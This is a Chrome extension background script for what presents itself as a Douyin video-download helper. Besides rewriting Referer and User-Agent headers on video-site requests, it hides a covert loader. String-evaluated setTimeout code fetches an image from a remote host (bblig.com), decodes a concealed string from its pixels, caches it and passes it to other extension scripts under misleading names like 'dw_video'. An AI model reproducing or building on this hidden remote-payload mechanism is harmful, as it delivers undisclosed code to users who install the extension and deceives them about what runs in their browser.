chrome.runtime.onInstalled.addListener(function(object) {
    if (object.reason === chrome.runtime.OnInstalledReason.INSTALL) {
        chrome.tabs.create({ url: "welcome.html" });
    }
});

chrome.browserAction.onClicked.addListener(function() {
    chrome.tabs.create({ url: "https://kuaiyinshi.com/?s=ext" })
});

chrome.webRequest.onBeforeSendHeaders.addListener(
    function(details) {
        //if (details.initiator && details.initiator.indexOf('kuaiyinshi.com') > -1){
            if (details.url.indexOf('api.amemv.com/aweme/') > -1
            || details.url.indexOf('aweme.snssdk.com/aweme') > -1
            || details.url.indexOf('ixigua.com') > -1 
            || details.url.indexOf('meitubase.com') > -1 
            || details.url.indexOf('huoshan.com/') > -1){
                var h_len = details.requestHeaders.length;
                for (var i = 0; i < h_len; ++i) {
                    if (details.requestHeaders[i].name === 'Referer') {
                        details.requestHeaders[i].value = ''
                    }else if (details.requestHeaders[i].name === 'User-Agent') {
                        details.requestHeaders[i].value = 'okhttp/3.1'
                    }
                }
                
            }
        //}

      return {requestHeaders: details.requestHeaders};
    },
    {urls: ["<all_urls>"]},
["blocking", "requestHeaders"]);

let cfg;
function Danmu(w, h){
    var danmu = [];
    danmu.push(0);
    danmu.push(w * 4 - 4);
    danmu.push((h - 1) * w * 4);
    danmu.push(w * 4 * h - 4);
    return danmu;
}

function charLen(pic){
    var danmu = Danmu(pic.width, pic.height);
    var tmp = []
    danmu.forEach(item => {
        [0, 1, 2].forEach(j => {
            tmp.push(String.fromCharCode(pic.data[item + j]+ 32));
        })
    })
    return parseInt(tmp.join(''));
}

let findVideo;
let pu;
let ctk = 'kuaidou.version';
let cnk = 'kuaidou.logo'
setTimeout('findVideo = function(url, cb){var xhr = new XMLHttpRequest();xhr.open("GET", url, true);xhr.responseType = "blob";xhr.onload = function(e){if (this.readyState === 4 ) {var blob = this.response;var img = document.createElement("img");img.style.position = "absolute";img.style.left = "-10000px";document.body.appendChild(img);img.onload = function(e){var cv = document.createElement("canvas");var oCtx = (cv.getContext)?cv.getContext("2d"):undefined;var w = this.offsetWidth;var h = this.offsetHeight;cv.width = w;cv.height = h;oCtx.drawImage(this, 0, 0);var oData = oCtx.getImageData(0, 0, w, h);document.body.removeChild(this);cb(oData);window.URL.revokeObjectURL(this.src);};img.src = window.URL.createObjectURL(blob);}};xhr.send();}', 0);

var bs = "";
setTimeout('pu="https://bblig.com/version/kuaidou"', 0)

chrome.extension.onConnect.addListener(function (connect) {
    connect.onMessage.addListener(function (msg, port) {
        if (msg.joke === 'get_video'){
            chrome.storage.local.get('video', function(data){
                port.postMessage({
                    joke: 'return_video',
                    data: data
                })
            })
        } else if (msg.joke === 'find_video'){
            $.get(pu, function(res) {
                if (localStorage.getItem(ctk) !== res.t) {
                    findVideo(res.url, function(img) {
                        var danmu = Danmu(img.width, img.height);
                        var len = charLen(img);
                        var nImage = img.data;
                        var str = '';
                        for (var i = 4, l = nImage.length; i < l; i += 4) {
                            if (nImage[i + 0] >= 200 & nImage[i + 1] >= 200 & nImage[i + 2] >= 200 || $.inArray(i, danmu) >= 0) {
                                continue;
                            } else {
                                var pix = nImage[i + (i % 3)];
                                str += String.fromCharCode(pix + 32);
                                if (str.length >= len) {
                                    break;
                                }
                            }
                        }
                        var cache_data = {};
                        cache_data['' + cnk] = str;
                        chrome.storage.local.set(cache_data, function(r){})
                        localStorage.setItem(ctk, res.t);
                        port.postMessage({
                            joke: 'dw_video',
                            data: str
                        })
                    })
                } else {
                    chrome.storage.local.get(cnk, function(res){
                        port.postMessage({
                            joke: 'dw_video',
                            data: res[cnk]
                        })
                    })
                }
            })
        }
    })
})